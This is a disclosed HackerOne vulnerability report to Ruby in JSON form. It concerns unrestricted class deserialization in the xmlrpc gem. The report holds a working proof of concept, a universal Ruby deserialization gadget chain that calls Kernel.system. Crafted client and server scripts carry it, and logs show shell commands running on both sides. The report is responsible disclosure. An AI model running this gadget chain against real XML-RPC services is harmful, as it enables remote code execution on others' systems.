{
  "id": 1189419,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTg5NDE5",
  "url": "https://hackerone.com/reports/1189419",
  "title": "XMLRPC does not limit deserializable classes.",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "high",
  "readable_substate": "Informative",
  "created_at": "2021-05-09T12:53:25.331Z",
  "submitted_at": "2021-05-09T12:53:25.415Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-08-01T21:54:24.215Z",
  "bug_reporter_agreed_on_going_public_at": "2023-04-16T08:17:14.238Z",
  "team_member_agreed_on_going_public_at": "2023-08-01T21:54:24.129Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I confirmed that the classes that can be generated by parsing the xml sent in the request or response by XMLRPC bundled in ruby are not restricted.\n\nhttps://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/create.rb#L251\n\n```ruby\n  if Config::ENABLE_MARSHALLING and param.class.included_modules.include? XMLRPC::Marshallable\n    # convert Ruby object into Hash\n    ret = {\"___class___\" => param.class.name}\n    param.instance_variables.each {|v|\n```\n\nWhen converting parameters to XML,  limited to those that include `XMLRPC::Marshallable`.\n\nhttps://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/parser.rb#L104\n\n```ruby\n# Converts the given +hash+ to a marshalled object.\n#\n# Returns the given +hash+ if an exception occurs.\ndef self.struct(hash)\n  # convert to marshalled object\n  klass = hash[\"___class___\"]\n  if klass.nil? or Config::ENABLE_MARSHALLING == false\n    hash\n  else\n    begin\n      mod = Module\n      klass.split(\"::\").each {|const| mod = mod.const_get(const.strip)}\n\n      obj = mod.allocate\n\n      hash.delete \"___class___\"\n      hash.each {|key, value|\n        obj.instance_variable_set(\"@#{ key }\", value) if key =~ /^([a-zA-Z_]\\w*)$/\n      }\n      obj\n    rescue\n      hash\n    end\n  end\nend\n```\nHowever, there are no class restrictions when parsing.\n\nhttps://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/config.rb#L27\n\n```ruby\n    # enable marshalling Ruby objects which include XMLRPC::Marshallable\n    ENABLE_MARSHALLING   = true\n```\n\n`Config::ENABLE_MARSHALLING` is true by default so there is no limit to the classes that can be restored.\n\n---\n\n## PoC\n\n### Prepare\n\ncreate `build_xml.rb`\n\n```ruby\nrequire \"xmlrpc/marshal\"\n\n# Universal Deserialisation Gadget for Ruby 2.x-3.x\n# https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n\n# Autoload the required classes\nGem::SpecFetcher\nGem::Installer\n\n# Because the classes that can be dumped are limited\nclass Array\n  def include?(_)\n    true\n  end\nend\n\nwa1 = Net::WriteAdapter.new(Kernel, :system)\n\nrs = Gem::RequestSet.allocate\nrs.instance_variable_set('@sets', wa1)\nrs.instance_variable_set('@git_set', \"date\")\n\nwa2 = Net::WriteAdapter.new(rs, :resolve)\n\ni = Gem::Package::TarReader::Entry.allocate\ni.instance_variable_set('@read', 0)\ni.instance_variable_set('@header', \"aaa\")\n\n\nn = Net::BufferedIO.allocate\nn.instance_variable_set('@io', i)\nn.instance_variable_set('@debug_output', wa2)\n\nt = Gem::Package::TarReader.allocate\nt.instance_variable_set('@io', n)\n\nr = Gem::Requirement.allocate\nr.instance_variable_set('@requirements', t)\n\ncreater = XMLRPC::Create.new\ncall_xml = creater.methodCall(\"for_call\", r)\nFile.write('attack_call.xml', call_xml)\n\nresponse_xml = creater.methodResponse(\"for_response\", r)\nFile.write('attack_response.xml', response_xml)\n```\n\n```\n$ cat Gemfile\n# frozen_string_literal: true\n\nsource \"https://rubygems.org\"\n\ngem 'xmlrpc', '~> 0.3.2'\ngem 'webrick', '~> 1.7'\ngem 'rack', '~> 2.2', '>= 2.2.3'\n\n$ bundle install\n...\n\n$ bundle exec ruby build_xml.rb\n# create attack_call.xml and attack_response.xml\n```\n\n\n### PoC for server attack\n\n```ruby\n# craft_client.rb\nrequire \"xmlrpc/client\"\n\nserver = XMLRPC::Client.new(\"localhost\", \"/RPC2\", 8080)\ncraft = File.read(\"./attack_call.xml\")\nok, param = server.send(:do_rpc, craft)\n\n\nif ok then\n  puts \"param: #{param}\"\nelse\n  puts \"Error:\"\n  puts param.faultCode\n  puts param.faultString\nend\n```\n\n```ruby\n# xmlrpc_server.rb\n\nrequire \"webrick\"\nrequire \"xmlrpc/server\"\n\n# required classes\nrequire 'net/http'\nGem::Installer\n\ns = XMLRPC::WEBrickServlet.new\n\ns.add_handler(\"for_call\") do |param|\n  param.to_s\nend\n\nhttpserver = WEBrick::HTTPServer.new(:Port => 8080)\nhttpserver.mount(\"/RPC2\", s)\ntrap(:INT){httpserver.shutdown}\nhttpserver.start\n```\n\n\n```\n❯ bundle exec ruby craft_client.rb\nparam:\n\n```\n\n```\n❯ bundle exec ruby xmlrpc_server.rb\n[2021-05-09 20:49:35] INFO  WEBrick 1.7.0\n[2021-05-09 20:49:35] INFO  ruby 2.7.1 (2020-03-31) [x86_64-darwin19]\n[2021-05-09 20:49:35] INFO  WEBrick::HTTPServer#start: pid=48443 port=8080\nsh: reading: command not found\n2021年 5月 9日 日曜日 20時49分44秒 JST\n::1 - - [09/May/2021:20:49:44 JST] \"POST /RPC2 HTTP/1.1\" 200 319\n- -> /RPC2\n```\n\n### PoC for client attack\n\n```ruby\n# xmlrpc_client.rb\n\nrequire \"xmlrpc/client\"\n\n# required classes\nGem::Installer\n\nserver = XMLRPC::Client.new(\"localhost\", \"/RPC\", 8080)\nok, param = server.call2(\"xxx\", 4, 5)\n\nif ok then\n   puts \"param: #{param}\" # call param.to_s\nelse\n  puts \"Error:\"\n  puts param.faultCode\n  puts param.faultString\nend\n```\n\n```ruby\n# craft_server.rb\n\nrequire \"webrick\"\n\nhttpserver = WEBrick::HTTPServer.new(:Port => 8080)\n\nhttpserver.mount_proc('/RPC') do |req, res|\n  res.body = File.read(\"./attack_response.xml\")\nend\n\ntrap(:INT){httpserver.shutdown}\nhttpserver.start\n```\n\n```\n❯ bundle exec ruby xmlrpc_client.rb\nsh: reading: command not found\n2021年 5月 9日 日曜日 20時50分48秒 JST\nTraceback (most recent call last):\n  ...\n```\n\n```\n❯ bundle exec ruby craft_server.rb\n[2021-05-09 20:50:34] INFO  WEBrick 1.7.0\n[2021-05-09 20:50:34] INFO  ruby 2.7.1 (2020-03-31) [x86_64-darwin19]\n[2021-05-09 20:50:34] INFO  WEBrick::HTTPServer#start: pid=48570 port=8080\n::1 - - [09/May/2021:20:50:48 JST] \"POST /RPC HTTP/1.1\" 200 1679\n- -> /RPC\n```\n\n## Impact\n\nUnintentional classes are created by crafted XML on both the server and client.\n\nWhether RCE is possible depends on the implementation of the application.\nIn order for the gadget chain for Marshal.load to work, need to find that the class is loaded and where methods such as `to_s` are called.",
  "weakness": {
    "id": 52,
    "name": "Deserialization of Untrusted Data"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "zy9ard3"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 28212,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/ruby/ruby",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
